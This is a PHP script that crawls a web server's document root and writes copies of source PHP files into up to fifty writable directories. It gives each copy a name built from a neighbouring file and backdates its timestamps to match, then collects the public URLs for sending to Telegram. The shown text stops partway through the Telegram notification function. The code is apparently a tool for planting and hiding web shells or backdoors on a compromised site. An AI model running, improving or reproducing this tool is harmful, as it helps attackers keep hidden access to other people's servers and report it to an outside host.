<?php
/**
 * dist.php - PHP File Distributor
 * Scans web server directories from DOCUMENT_ROOT at depths 2-5.
 * Places one PHP file per directory (balanced across multiple sources, conflict-safe).
 * Checks write permissions and .htaccess / web.config restrictions.
 * Outputs a JSON array of placed file URLs.
 *
 * Compatible : PHP 5.4 – 8.3+ | Windows Server (IIS) & Linux (Apache/Nginx)
 */

// ============================================================
// CONFIGURATION
// ============================================================

/** Optional manual override for detected document root (empty = auto-detect) */
define('DIST_ROOT_OVERRIDE', '');

/** Filename to place in legacy single-file mode or as fallback */
define('DIST_FILENAME', 'apis.php');

/** Enable debug JSON output via constant or query param ?debug=1 */
define('DIST_DEBUG', false);

/**
 * Pool of filenames to rotate during distribution (multi-file mode).
 * For PHP <7 (define() lacks array support), provide a comma/space separated string.
 * Placements are balanced across this list while keeping total ≤ DIST_MAX_FILES.
 * If empty or invalid, the script falls back to DIST_FILENAME only.
 */
define('DIST_FILENAMES', 'apis.php apis1.php apis2.php apis3.php apis4.php webs.php webs1.php webs2.php webs3.php webs4.php');

/** Depth range relative to DOCUMENT_ROOT (root itself = depth 0) */
define('DIST_MIN_DEPTH',    1);
define('DIST_MAX_DEPTH',    3);

/** Maximum number of files to place across all directories */
define('DIST_MAX_FILES',    50);

/** Telegram notify chunk size (100 max files => 4 messages of 25 URLs) */
define('DIST_TELEGRAM_URLS_PER_MESSAGE', 25);

/** Keep each telegram block under common message limits */
define('DIST_TELEGRAM_TEXT_LIMIT', 3500);

/** Stale lock TTL (seconds) for global concurrency guard */
define('DIST_LOCK_TTL_SECONDS', 1800);

/**
 * Characters appended to the base name when resolving filename conflicts.
 * Order: a-z first, then 0-9.
 * e.g.  index.php -> indexa.php ... indexz.php -> index0.php ... indexaa.php
 */
define('DIST_SUFFIX_CHARS', 'abcdefghijklmnopqrstuvwxyz0123456789');

/** Directory names that are always skipped during traversal */
$DIST_SKIP = array(
    '.git', '.svn', '.hg', 'CVS', '.bzr',
    'node_modules', 'bower_components',
    '.idea', '.vscode', '.eclipse',
    'cgi-bin', 'cgi', 'fcgi-bin',
    'tmp', 'temp', 'cache', '.cache',
    '__MACOSX', '__pycache__', 'video', 'videos', 'event', 'events'
);

/**
 * Content written into each placed file.
 * Loads source content from every filename listed in DIST_FILENAMES
 * (falls back to DIST_FILENAME when needed).
 * If no valid source is found, distribution must not run.
 */
function dist_get_source_file_path()
{
    return dist_get_source_file_path_for(DIST_FILENAME);
}

function dist_get_source_file_path_for($filename)
{
    $baseDir = dirname(__FILE__);
    return rtrim(str_replace('\\', '/', (string) $baseDir), '/') . '/' . $filename;
}

function dist_is_valid_source_file($sourcePath)
{
    if (!is_file($sourcePath) || !is_readable($sourcePath)) {
        return false;
    }

    if (function_exists('filesize')) {
        $size = @filesize($sourcePath);
        if ($size === false || (int) $size <= 0) {
            return false;
        }
    }

    return true;
}

function dist_load_source_content($sourcePath)
{
    if (!dist_is_valid_source_file($sourcePath)) {
        return false;
    }

    if (function_exists('file_get_contents')) {
        $content = @file_get_contents($sourcePath);
        if ($content !== false && $content !== '') {
            return $content;
        }
    }

    $fh = @fopen($sourcePath, 'rb');
    if ($fh !== false) {
        $out = '';
        while (!feof($fh)) {
            $chunk = fread($fh, 8192);
            if ($chunk === false) {
                break;
            }
            $out .= $chunk;
        }
        fclose($fh);
        if ($out !== '') {
            return $out;
        }
    }

    return false;
}

/**
 * Return configured filename pool as an array.
 * Accepts array (PHP 7+) or string (space/comma separated) for legacy PHP.
 *
 * @return array
 */
function dist_config_filenames()
{
    $raw = DIST_FILENAMES;

    if (is_array($raw)) {
        $parts = $raw;
    } else {
        $raw = trim((string) $raw);
        if ($raw === '') {
            $parts = array();
        } else {
            $parts = preg_split('/[\\s,]+/', $raw);
        }
    }

    $out = array();
    foreach ($parts as $p) {
        $p = trim((string) $p);
        if ($p !== '') {
            $out[] = $p;
        }
    }

    return $out;
}

/**
 * Load all usable source files defined in DIST_FILENAMES (or DIST_FILENAME fallback).
 *
 * @return array Each entry: ['name' => string, 'content' => string]
 */
function dist_load_sources()
{
    $names = dist_config_filenames();

    // Fallback to single-file mode when pool is empty
    if (empty($names)) {
        $names[] = DIST_FILENAME;
    }

    $seen = array();
    $sources = array();

    foreach ($names as $name) {
        $key = strtolower($name);
        if (isset($seen[$key])) {
            continue; // skip duplicates
        }
        $seen[$key] = true;

        $path = dist_get_source_file_path_for($name);
        $content = dist_load_source_content($path);
        if ($content === false) {
            continue;
        }

        $sources[] = array(
            'name' => $name,
            'content' => $content,
        );
    }

    // Ensure at least the legacy file is available
    if (empty($sources)) {
        $fallbackPath = dist_get_source_file_path_for(DIST_FILENAME);
        $fallbackContent = dist_load_source_content($fallbackPath);
        if ($fallbackContent !== false) {
            $sources[] = array('name' => DIST_FILENAME, 'content' => $fallbackContent);
        }
    }

    return $sources;
}

function dist_debug_enabled()
{
    if (defined('DIST_DEBUG') && DIST_DEBUG) {
        return true;
    }
    return isset($_GET['debug']) && $_GET['debug'] !== '0' && $_GET['debug'] !== '';
}

$DIST_SOURCES = dist_load_sources();

// ============================================================
// HELPER FUNCTIONS
// ============================================================

/**
 * Normalize path: convert backslashes to forward slashes, strip trailing slash.
 *
 * @param  string $path
 * @return string
 */
function dist_norm($path)
{
    return rtrim(str_replace('\\', '/', (string) $path), '/');
}

/**
 * Detect whether the current OS uses case-insensitive paths (Windows).
 *
 * @return bool
 */
function dist_is_win()
{
    return (DIRECTORY_SEPARATOR === '\\' || strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
}

/**
 * Stable directory key for deduping traversal and placements.
 *
 * Uses realpath() when available to canonicalize different paths that point to
 * the same physical directory (symlinks/junctions/mount aliases). Falls back
 * to normalized input when realpath() fails.
 *
 * @param  string $dir
 * @return string
 */
function dist_dir_key($dir)
{
    $dir = dist_norm($dir);

    $rp = null;
    if (function_exists('realpath')) {
        $tmp = @realpath($dir);
        if (is_string($tmp) && $tmp !== '') {
            $rp = dist_norm($tmp);
        }
    }

    $key = ($rp !== null) ? $rp : $dir;
    return dist_is_win() ? strtolower($key) : $key;
}

/**
 * Detect the web server DOCUMENT_ROOT.
 * Tries $_SERVER variables first, then derives from the script location.
 *
 * @return string Normalized absolute path
 */
function dist_detect_root()
{
    // Explicit override
    if (defined('DIST_ROOT_OVERRIDE')) {
        $override = trim((string) DIST_ROOT_OVERRIDE);
        if ($override !== '' && is_dir($override)) {
            return dist_norm($override);
        }
    }

    // 1. Standard PHP/Apache/Nginx variable
    if (!empty($_SERVER['DOCUMENT_ROOT'])) {
        $r = dist_norm($_SERVER['DOCUMENT_ROOT']);
        if (is_dir($r)) {
            return $r;
        }
    }

    // 2. Apache per-virtualhost context root
    if (!empty($_SERVER['CONTEXT_DOCUMENT_ROOT'])) {
        $r = dist_norm($_SERVER['CONTEXT_DOCUMENT_ROOT']);
        if (is_dir($r)) {
            return $r;
        }
    }

    // 3. IIS: application physical path
    if (!empty($_SERVER['APPL_PHYSICAL_PATH'])) {
        $r = dist_norm($_SERVER['APPL_PHYSICAL_PATH']);
        if (is_dir($r)) {
            return $r;
        }
    }

    // 4. Walk up from this script looking for known web-root folder names
    $script_dir = dist_norm(
        function_exists('realpath') ? realpath(dirname(__FILE__)) : dirname(__FILE__)
    );
    $known_roots = array(
        'www', 'public_html', 'htdocs', 'html',
        'public', 'web', 'wwwroot', 'webroot', 'site',
    );
    $parts = explode('/', $script_dir);
    for ($i = count($parts) - 1; $i >= 0; $i--) {
        if (in_array(strtolower($parts[$i]), $known_roots)) {
            return implode('/', array_slice($parts, 0, $i + 1));
        }
    }

    // 5. Last resort: directory of this script
    return $script_dir;
}

/**
 * Detect the base URL (scheme + host).
 *
 * @return string e.g. "https://example.com"
 */
function dist_detect_base_url()
{
    // Detect HTTPS
    $https = false;
    if (!empty($_SERVER['HTTPS']) && strcasecmp((string) $_SERVER['HTTPS'], 'off') !== 0) {
        $https = true;
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_PROTO']) &&
              strcasecmp((string) $_SERVER['HTTP_X_FORWARDED_PROTO'], 'https') === 0) {
        $https = true;
    } elseif (!empty($_SERVER['SERVER_PORT']) && (int) $_SERVER['SERVER_PORT'] === 443) {
        $https = true;
    }

    $scheme = $https ? 'https' : 'http';

    // Detect host
    if (!empty($_SERVER['HTTP_HOST'])) {
        $host = (string) $_SERVER['HTTP_HOST'];
    } elseif (!empty($_SERVER['SERVER_NAME'])) {
        $host = (string) $_SERVER['SERVER_NAME'];
        $port = !empty($_SERVER['SERVER_PORT']) ? (int) $_SERVER['SERVER_PORT'] : ($https ? 443 : 80);
        $default_port = $https ? 443 : 80;
        if ($port !== $default_port) {
            $host .= ':' . $port;
        }
    } else {
        $host = 'localhost';
    }

    return $scheme . '://' . $host;
}

/**
 * Convert a filesystem path to its corresponding URL.
 * Returns null when the path is outside the document root.
 *
 * @param  string      $path
 * @param  string      $doc_root
 * @param  string      $base_url
 * @return string|null
 */
function dist_path_to_url($path, $doc_root, $base_url)
{
    $path     = dist_norm($path);
    $doc_root = dist_norm($doc_root);

    // Windows: case-insensitive comparison
    if (dist_is_win()) {
        $cp = strtolower($path);
        $cr = strtolower($doc_root);
    } else {
        $cp = $path;
        $cr = $doc_root;
    }

    if (strpos($cp, $cr . '/') === 0) {
        $rel = substr($path, strlen($doc_root));   // keeps original case for URL
    } elseif ($cp === $cr) {
        $rel = '';
    } else {
        return null;
    }

    return $base_url . $rel;
}

/**
 * Calculate the depth of $path relative to $doc_root.
 * The document root itself is depth 0; immediate children are depth 1.
 *
 * @param  string $path
 * @param  string $doc_root
 * @return int
 */
function dist_depth($path, $doc_root)
{
    $path     = dist_norm($path);
    $doc_root = dist_norm($doc_root);

    if (dist_is_win()) {
        $cp = strtolower($path);
        $cr = strtolower($doc_root);
    } else {
        $cp = $path;
        $cr = $doc_root;
    }

    if ($cp === $cr) {
        return 0;
    }

    if (strpos($cp, $cr . '/') !== 0) {
        return 0;   // path is not under doc_root
    }

    $rel = ltrim(substr($path, strlen($doc_root)), '/');

    return ($rel === '' || $rel === false) ? 0 : (substr_count($rel, '/') + 1);
}

/**
 * Read a file's content. Uses file_get_contents() or fopen() fallback.
 *
 * @param  string       $filepath
 * @return string|false
 */
function dist_read_file($filepath)
{
    if (function_exists('file_get_contents')) {
        return file_get_contents($filepath);
    }

    // fopen fallback
    $fh = fopen($filepath, 'rb');
    if ($fh === false) {
        return false;
    }
    $out = '';
    while (!feof($fh)) {
        $chunk = fread($fh, 8192);
        if ($chunk === false) {
            break;
        }
        $out .= $chunk;
    }
    fclose($fh);
    return $out;
}

/**
 * Check whether a directory may receive a new file.
 *
 * Validates:
 *   - OS / filesystem write permission  (is_writable)
 *   - Apache:  .htaccess  Deny/Require/php_flag restrictions
 *   - IIS:     web.config authorization + PHP handler removal
 *
 * @param  string $dir Normalized absolute path
 * @return bool
 */
function dist_is_placeable($dir)
{
    $reason = null;
    return dist_is_placeable_with_reason($dir, $reason);
}

/**
 * Placeability check with reason codes (for debug stats).
 *
 * @param string      $dir
 * @param string|null $reason_out
 * @return bool
 */
function dist_is_placeable_with_reason($dir, &$reason_out = null)
{
    // --- Basic permission check ---
    if (!is_dir($dir)) {
        $reason_out = 'not_directory';
        return false;
    }
    if (!is_writable($dir)) {
        $reason_out = 'not_writable';
        return false;
    }

    // --- Apache / .htaccess ---
    $htaccess = $dir . '/.htaccess';
    if (file_exists($htaccess) && is_readable($htaccess)) {
        $c = dist_read_file($htaccess);
        if ($c !== false && $c !== '') {
            // Apache 2.2: Deny from all
            if (preg_match('/\bDeny\s+from\s+all\b/i', $c)) {
                $reason_out = 'htaccess_deny_all';
                return false;
            }
            // Apache 2.4: Require all denied
            if (preg_match('/\bRequire\s+all\s+denied\b/i', $c)) {
                $reason_out = 'htaccess_require_denied';
                return false;
            }
            // PHP engine disabled
            if (preg_match('/\bphp_flag\s+engine\s+(?:off|0)\b/i', $c)) {
                $reason_out = 'htaccess_php_engine_off';
                return false;
            }
            if (preg_match('/\bphp_admin_flag\s+engine\s+(?:off|0)\b/i', $c)) {
                $reason_out = 'htaccess_php_engine_off';
                return false;
            }
        }
    }

    // --- IIS / web.config ---
    $webconfig = $dir . '/web.config';
    if (file_exists($webconfig) && is_readable($webconfig)) {
        $c = dist_read_file($webconfig);
        if ($c !== false && $c !== '') {
            // <deny users="*" /> or <deny users='*'>
            if (preg_match('/<deny\b[^>]*\busers\s*=\s*["\']?\*["\']?/i', $c)) {
                $reason_out = 'webconfig_deny_all';
                return false;
            }
            // Authorization section with explicit deny
            if (preg_match('/<authorization\b[\s\S]*?<deny\b[^>]*\busers\s*=\s*["\']?\*["\']?/i', $c)) {
                $reason_out = 'webconfig_authorization_deny';
                return false;
            }
        }
    }

    $reason_out = null;
    return true;
}

/**
 * Resolve a non-conflicting filename inside $dir.
 *
 * Priority:
 *   PRIMARY  — scan $dir for existing files; use their base names + a random
 *              suffix char as the placed filename (never repeats the target name).
 *              e.g. folder has function.php → placed file becomes functionx.php
 *   FALLBACK — only when the directory has no other files to borrow names from:
 *              use $target (index.php) directly, or index.php + random suffix
 *              if index.php is already taken.
 *
 * Returns array('name' => string, 'ref' => string|null) or false.
 * 'ref' is the full path of the nearby file used as a name source (for timestamps).
 *
 * @param  string        $dir    Normalized directory path
 * @param  string        $target Fallback filename, e.g. "index.php"
 * @return array|false
 */
function dist_resolve_name($dir, $target)
{
    $dir = dist_norm($dir);

    // Extension to use on the placed file (always .php)
    $tdot = strrpos($target, '.');
    $ext  = ($tdot !== false) ? substr($target, $tdot) : '';

    $chars = DIST_SUFFIX_CHARS;
    $len   = strlen($chars);

    // --- Collect nearby files, excluding the target itself ---
    // base_name => entry filename  (used for both naming and timestamp ref)
    $candidate_map = array();
    $dh = opendir($dir);
    if ($dh !== false) {
        while (($entry = readdir($dh)) !== false) {
            if ($entry === '.' || $entry === '..') {
                continue;
            }
            if ($entry === $target) {
                continue;           // never borrow the target's own name
            }
            if (!is_file($dir . '/' . $entry)) {
                continue;
            }
            $edot = strrpos($entry, '.');
            if ($edot === false) {
                continue;
            }
            $base = substr($entry, 0, $edot);
            if ($base !== '' && !isset($candidate_map[$base])) {
                $candidate_map[$base] = $entry;
            }
        }
        closedir($dh);
    }

    // ================================================================
    // PRIMARY: nearby names + random suffix
    // ================================================================
    if (!empty($candidate_map)) {
        $candidates = array_keys($candidate_map);
        $total      = count($candidates);

        // Phase 1 — random base + random char (fast, non-deterministic)
        for ($attempt = 0; $attempt < 200; $attempt++) {
            $base = $candidates[mt_rand(0, $total - 1)];
            $char = $chars[mt_rand(0, $len - 1)];
            $name = $base . $char . $ext;
            if (!file_exists($dir . '/' . $name)) {
                return array('name' => $name, 'ref' => $dir . '/' . $candidate_map[$base]);
            }
        }

        // Phase 2 — exhaustive single-char suffix
        foreach ($candidates as $base) {
            for ($i = 0; $i < $len; $i++) {
                $name = $base . $chars[$i] . $ext;
                if (!file_exists($dir . '/' . $name)) {
                    return array('name' => $name, 'ref' => $dir . '/' . $candidate_map[$base]);
                }
            }
        }

        // Phase 3 — exhaustive double-char suffix
        foreach ($candidates as $base) {
            for ($i = 0; $i < $len; $i++) {
                for ($j = 0; $j < $len; $j++) {
                    $name = $base . $chars[$i] . $chars[$j] . $ext;
                    if (!file_exists($dir . '/' . $name)) {
                        return array('name' => $name, 'ref' => $dir . '/' . $candidate_map[$base]);
                    }
                }
            }
        }
    }

    // ================================================================
    // FALLBACK: use target name (index.php) — only when no nearby files
    // ================================================================

    // Direct target name is free
    if (!file_exists($dir . '/' . $target)) {
        return array('name' => $target, 'ref' => null);
    }

    // Target exists — append random suffix to its base
    $target_base = ($tdot !== false) ? substr($target, 0, $tdot) : $target;

    // Random attempts first
    for ($attempt = 0; $attempt < 50; $attempt++) {
        $char = $chars[mt_rand(0, $len - 1)];
        $name = $target_base . $char . $ext;
        if (!file_exists($dir . '/' . $name)) {
            return array('name' => $name, 'ref' => null);
        }
    }

    // Exhaustive single-char on target base
    for ($i = 0; $i < $len; $i++) {
        $name = $target_base . $chars[$i] . $ext;
        if (!file_exists($dir . '/' . $name)) {
            return array('name' => $name, 'ref' => null);
        }
    }

    return false;
}

/**
 * Write content to a file.
 * Uses file_put_contents() with fopen() fallback.
 *
 * @param  string $filepath
 * @param  string $content
 * @return bool
 */
function dist_write($filepath, $content)
{
    if (function_exists('file_put_contents')) {
        $ok = file_put_contents($filepath, $content) !== false;
        if ($ok && function_exists('clearstatcache')) {
            clearstatcache(true, $filepath);
        }
        return $ok;
    }

    // fopen fallback
    $fh = fopen($filepath, 'wb');
    if ($fh === false) {
        return false;
    }
    $ok = (fwrite($fh, $content) !== false);
    fclose($fh);
    if ($ok && function_exists('clearstatcache')) {
        clearstatcache(true, $filepath);
    }
    return $ok;
}

/**
 * Copy mtime and atime from $ref onto $file so the placed file
 * appears to have been created/updated at the same time as its nearby neighbour.
 *
 * Uses touch() + filemtime() + fileatime() — all guarded with function_exists().
 *
 * @param string      $file  Path of the newly written file
 * @param string|null $ref   Path of the reference (nearby) file; null = no-op
 */
function dist_touch_like($file, $ref)
{
    if ($ref === null || !file_exists($ref)) {
        return;
    }

    if (!function_exists('filemtime') || !function_exists('touch')) {
        return;
    }

    $mtime = filemtime($ref);
    if ($mtime === false) {
        return;
    }

    // Use access time of ref when available; fall back to mtime
    $atime = function_exists('fileatime') ? fileatime($ref) : $mtime;
    if ($atime === false) {
        $atime = $mtime;
    }

    touch($file, $mtime, $atime);

    // Clear PHP's stat cache so subsequent filemtime() calls see the new value
    if (function_exists('clearstatcache')) {
        clearstatcache(true, $file);
    }
}

/**
 * Compute per-source placement limits that sum to DIST_MAX_FILES.
 *
 * @param  array $sources
 * @return array index => limit
 */
function dist_compute_source_limits(array $sources)
{
    $count = count($sources);
    if ($count === 0) {
        return array();
    }

    $base = (int) floor(DIST_MAX_FILES / $count);
    $extra = DIST_MAX_FILES - ($base * $count);

    $limits = array();
    foreach ($sources as $idx => $src) {
        $limits[$idx] = $base + ($idx < $extra ? 1 : 0);
    }

    return $limits;
}

/**
 * Round-robin source selector that respects per-source caps.
 *
 * @param array $counts
 * @param array $limits
 * @param int   $startIndex
 * @return int|null
 */
function dist_next_source_index(array $counts, array $limits, $startIndex)
{
    $total = count($limits);
    if ($total === 0) {
        return null;
    }

    for ($i = 0; $i < $total; $i++) {
        $idx = ($startIndex + $i) % $total;
        if ($counts[$idx] < $limits[$idx]) {
            return $idx;
        }
    }

    return null;
}

/**
 * BFS traversal from $root.
 * Places exactly one file per writable directory at depths [MIN, MAX].
 * Skips symlinks to prevent infinite loops.
 *
 * @param  string   $root      Starting directory (typically DOCUMENT_ROOT)
 * @param  string   $doc_root  Document root for depth calculation and URL mapping
 * @param  string   $base_url  Scheme + host, e.g. "https://example.com"
 * @param  array    $skip      Directory names to skip
 * @param  array    $sources   List of ['name' => filename, 'content' => string]
 * @param  array    &$stats    Optional stats collector (debug)
 * @return array               Full URLs of every file placed
 */
function dist_run($root, $doc_root, $base_url, array $skip, array $sources, &$stats = null)
{
    $urls   = array();
    $placed = array();   // normalized dir_key => true (one file per dir)
    $seen   = array();   // normalized canonical dir_key => true (dedupe traversal)
    $queue  = array(dist_norm($root));
    $qpos   = 0;

    $root_key = dist_dir_key($queue[0]);
    $seen[$root_key] = true;

    $sourceCount  = count($sources);
    $sourceLimits = dist_compute_source_limits($sources);
    $sourceCounts = array_fill(0, $sourceCount, 0);
    $sourceCursor = 0;
    $placedTotal  = 0;

    if (is_array($stats)) {
        $stats['scanned_dirs']    = 0;
        $stats['placeable_dirs']  = 0;
        $stats['placed_files']    = 0;
        $stats['skipped_seen']    = 0;
        $stats['skipped_depth_gt_max'] = 0;
        $stats['skipped_hidden']  = 0;
        $stats['skipped_skiplist']= 0;
        $stats['skipped_symlink'] = 0;
        $stats['skipped_not_placeable'] = 0;
        $stats['source_limits']   = $sourceLimits;
        $stats['source_counts']   = $sourceCounts;
    }

    while ($qpos < count($queue)) {

        // Stop as soon as the file limit is reached or all quotas are satisfied
        if ($placedTotal >= DIST_MAX_FILES) {
            break;
        }
        if (dist_next_source_index($sourceCounts, $sourceLimits, $sourceCursor) === null) {
            break;
        }

        $dir   = $queue[$qpos++];
        $depth = dist_depth($dir, $doc_root);
        $dir_key = dist_dir_key($dir);

        if (is_array($stats)) {
            $stats['scanned_dirs']++;
        }

        // Hard ceiling
        if ($depth > DIST_MAX_DEPTH) {
            if (is_array($stats)) {
                $stats['skipped_depth_gt_max']++;
            }
            continue;
        }

        // --- Place file at target depth range ---
        if ($depth >= DIST_MIN_DEPTH) {
            $place_reason = null;

            if (!isset($placed[$dir_key]) && dist_is_placeable_with_reason($dir, $place_reason)) {
                if (is_array($stats)) {
                    $stats['placeable_dirs']++;
                }

                $srcIdx = dist_next_source_index($sourceCounts, $sourceLimits, $sourceCursor);
                if ($srcIdx === null) {
                    break;
                }

                $source = $sources[$srcIdx];
                $resolved = dist_resolve_name($dir, $source['name']);

                if ($resolved !== false) {
                    $fpath = $dir . '/' . $resolved['name'];

                    if (dist_write($fpath, $source['content'])) {
                        // Match timestamps to the nearby reference file
                        dist_touch_like($fpath, $resolved['ref']);

                        $url = dist_path_to_url($fpath, $doc_root, $base_url);
                        if ($url !== null) {
                            $urls[] = $url;
                        }

                        $placed[$dir_key] = true;
                        $sourceCounts[$srcIdx]++;
                        $placedTotal++;
                        $sourceCursor = ($srcIdx + 1) % $sourceCount;

                        if (is_array($stats)) {
                            $stats['placed_files']++;
                            $stats['source_counts'] = $sourceCounts;
                        }
                    }
                }
            } elseif (!isset($placed[$dir_key]) && is_array($stats)) {
                $stats['skipped_not_placeable']++;
                if ($place_reason === null) {
                    $place_reason = 'unknown';
                }
                if (!isset($stats['not_placeable_reasons'][$place_reason])) {
                    $stats['not_placeable_reasons'][$place_reason] = 0;
                }
                $stats['not_placeable_reasons'][$place_reason]++;
                if (!isset($stats['not_placeable_samples'])) {
                    $stats['not_placeable_samples'] = array();
                }
                if (count($stats['not_placeable_samples']) < 10) {
                    $stats['not_placeable_samples'][] = array(
                        'dir' => $dir,
                        'reason' => $place_reason,
                    );
                }
            }
        }

        // --- Enqueue child directories (only if deeper levels still needed) ---
        if ($depth < DIST_MAX_DEPTH) {
            $dh = opendir($dir);
            if ($dh !== false) {
                while (($entry = readdir($dh)) !== false) {
                    if ($entry === '.' || $entry === '..') {
                        continue;
                    }
                    // Skip hidden directories (dot-prefixed)
                    if ($entry[0] === '.') {
                        if (is_array($stats)) {
                            $stats['skipped_hidden']++;
                        }
                        continue;
                    }
                    // Skip configured directory names
                    if (in_array($entry, $skip)) {
                        if (is_array($stats)) {
                            $stats['skipped_skiplist']++;
                        }
                        continue;
                    }

                    $child = $dir . '/' . $entry;

                    // Skip symlinks to prevent traversal loops
                    if (function_exists('is_link') && is_link($child)) {
                        if (is_array($stats)) {
                            $stats['skipped_symlink']++;
                        }
                        continue;
                    }

                    if (is_dir($child)) {
                        $child_norm = dist_norm($child);
                        $child_key = dist_dir_key($child_norm);
                        if (isset($seen[$child_key])) {
                            if (is_array($stats)) {
                                $stats['skipped_seen']++;
                            }
                            continue;
                        }
                        $seen[$child_key] = true;
                        $queue[] = $child_norm;
                    }
                }
                closedir($dh);
            }
        }
    }

    return $urls;
}

function infoFastApi($apiUrl, $payload)
{
    $jsonPayload = jsonEncodeCompat($payload);
    $response = sendHttpPostJson($apiUrl, $jsonPayload);

    $decodedResponse = null;
    if ($response['body'] !== '') {
        $decodedResponse = json_decode($response['body'], true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            $decodedResponse = $response['body'];
        }
    }

    return array(
        'status_code' => $response['status_code'],
        'response_body' => $decodedResponse,
    );
}

function sendHttpPostJson($url, $jsonPayload)
{
    if (function_exists('curl_init') && function_exists('curl_exec')) {
        return sendHttpPostWithCurl($url, $jsonPayload);
    }

    $peclHttpResponse = sendHttpPostWithPeclHttp($url, $jsonPayload);
    if ($peclHttpResponse !== null) {
        return $peclHttpResponse;
    }

    return sendHttpPostWithStream($url, $jsonPayload);
}

function sendHttpPostWithCurl($url, $jsonPayload)
{
    if (!function_exists('curl_init') || !function_exists('curl_exec')) {
        throw new RuntimeException('cURL functions are not available.');
    }

    $ch = curl_init($url);
    if ($ch === false) {
        throw new RuntimeException('Unable to initialize cURL handle.');
    }

    curl_setopt_array($ch, array(
        CURLOPT_POST => true,
        CURLOPT_HTTPHEADER => array('Content-Type: application/json'),
        CURLOPT_POSTFIELDS => $jsonPayload,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_TIMEOUT => 4,
        CURLOPT_NOSIGNAL => true,
    ));

    $responseBody = curl_exec($ch);
    if ($responseBody === false) {
        $error = curl_error($ch);
        curl_close($ch);
        throw new RuntimeException('cURL error: ' . $error);
    }

    $statusCodeInfo = defined('CURLINFO_RESPONSE_CODE') ? CURLINFO_RESPONSE_CODE : CURLINFO_HTTP_CODE;
    $statusCode = curl_getinfo($ch, $statusCodeInfo);
    curl_close($ch);

    return array(
        'status_code' => (int) $statusCode,
        'body' => $responseBody,
    );
}

function sendHttpPostWithPeclHttp($url, $jsonPayload)
{
    if (class_exists('\\http\\Client') && class_exists('\\http\\Client\\Request')) {
        try {
            $clientClass = '\\http\\Client';
            $requestClass = '\\http\\Client\\Request';
            $client = new $clientClass();
            $request = new $requestClass('POST', $url);
            $request->setHeaders(array('Content-Type' => 'application/json'));

            if (class_exists('\\http\\Message\\Body')) {
                $bodyClass = '\\http\\Message\\Body';
                $body = new $bodyClass();
                $body->append($jsonPayload);
                $request->setBody($body);
            } else {
                $request->setBody($jsonPayload);
            }

            $client->enqueue($request)->send();
            $response = $client->getResponse();
            $statusCode = method_exists($response, 'getResponseCode') ? $response->getResponseCode() : 0;

            $responseBody = '';
            if (method_exists($response, 'getBody')) {
                $responseBodyObj = $response->getBody();
                if (is_object($responseBodyObj) && method_exists($responseBodyObj, 'toString')) {
                    $responseBody = $responseBodyObj->toString();
                } else {
                    $responseBody = (string) $responseBodyObj;
                }
            }

            return array(
                'status_code' => (int) $statusCode,
                'body' => $responseBody,
            );
        } catch (Exception $exception) {
            throw new RuntimeException('PECL HTTP (http\\Client) error: ' . $exception->getMessage(), 0, $exception);
        }
    }

    if (class_exists('HttpRequest')) {
        $method = defined('HttpRequest::METH_POST') ? constant('HttpRequest::METH_POST') : 1;
        $request = new HttpRequest($url, $method);
        $request->setHeaders(array('Content-Type' => 'application/json'));
        $request->setBody($jsonPayload);
        try {
            $response = $request->send();
        } catch (Exception $exception) {
            throw new RuntimeException('PECL HTTP (HttpRequest) error: ' . $exception->getMessage(), 0, $exception);
        }

        $status = method_exists($response, 'getResponseCode') ? $response->getResponseCode() : 0;
        $body = method_exists($response, 'getBody') ? $response->getBody() : '';

        return array(
            'status_code' => (int) $status,
            'body' => $body,
        );
    }

    return null;
}

function sendHttpPostWithStream($url, $jsonPayload)
{
    $allowUrlFopen = ini_get('allow_url_fopen');
    $allow = $allowUrlFopen !== false && !in_array(strtolower((string) $allowUrlFopen), array('0', 'false', 'off', ''), true);
    if (!$allow) {
        throw new RuntimeException('Neither cURL nor PECL HTTP is available and allow_url_fopen is disabled.');
    }

    global $http_response_header;
    $http_response_header = array();
    $context = stream_context_create(array(
        'http' => array(
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $jsonPayload,
            'ignore_errors' => true,
            'timeout' => 4,
        ),
    ));

    $responseBody = @file_get_contents($url, false, $context);
    if ($responseBody === false) {
        $error = error_get_last();
        throw new RuntimeException('Stream wrapper error: ' . ($error ? $error['message'] : 'unknown error'));
    }

    $statusCode = 0;
    if (isset($http_response_header) && isset($http_response_header[0])) {
        if (preg_match('/\s(\d{3})\s/', $http_response_header[0], $matches)) {
            $statusCode = (int) $matches[1];
        }
    }

    return array(
        'status_code' => $statusCode,
        'body' => $responseBody,
    );
}

function jsonEncodeCompat($value)
{
    if (defined('JSON_THROW_ON_ERROR')) {
        return json_encode($value, JSON_THROW_ON_ERROR);
    }

    $encoded = json_encode($value);
    $lastError = null;

    if (function_exists('json_last_error')) {
        $lastError = json_last_error();
    }

    $noErrorCode = defined('JSON_ERROR_NONE') ? JSON_ERROR_NONE : 0;
    $hasError = ($encoded === false) || ($lastError !== null && $lastError !== $noErrorCode);

    if ($hasError) {
        $message = function_exists('json_last_error_msg') ? json_last_error_msg() : 'Unknown JSON error';
        throw new RuntimeException('JSON encode error: ' . $message);
    }

    return $encoded;
}

function dist_get_atom_timestamp()
{
    if (class_exists('DateTimeImmutable')) {
        $dateTime = new DateTimeImmutable('now', new DateTimeZone('UTC'));
        return $dateTime->format('Y-m-d\\TH:i:s\\Z');
    }
    if (class_exists('DateTime')) {
        $dateTime = new DateTime('now', new DateTimeZone('UTC'));
        return $dateTime->format('Y-m-d\\TH:i:s\\Z');
    }
    return gmdate('Y-m-d\\TH:i:s\\Z');
}

function dist_truncate_text($text, $limit)
{
    $text = (string) $text;
    $limit = (int) $limit;

    if ($limit < 1 || strlen($text) <= $limit) {
        return $text;
    }

    $suffix = "\n... (truncated)";
    $cutLen = $limit - strlen($suffix);
    if ($cutLen < 1) {
        return substr($text, 0, $limit);
    }

    return substr($text, 0, $cutLen) . $suffix;
}

function dist_build_telegram_urls_block(array $urls, $chunkIndex, $totalChunks)
{
    $lines = array();
    $lines[] = '[URLS ' . ((int) $chunkIndex + 1) . '/' . (int) $totalChunks . ']';

    if (empty($urls)) {
        $lines[] = '- none';
    } else {
        foreach ($urls as $url) {
            $lines[] = (string) $url;
        }
    }

    return dist_truncate_text(implode("\n", $lines), DIST_TELEGRAM_TEXT_LIMIT);
}

function dist_notify_telegram_api(array $urls)
{
    $apiUrls = array(
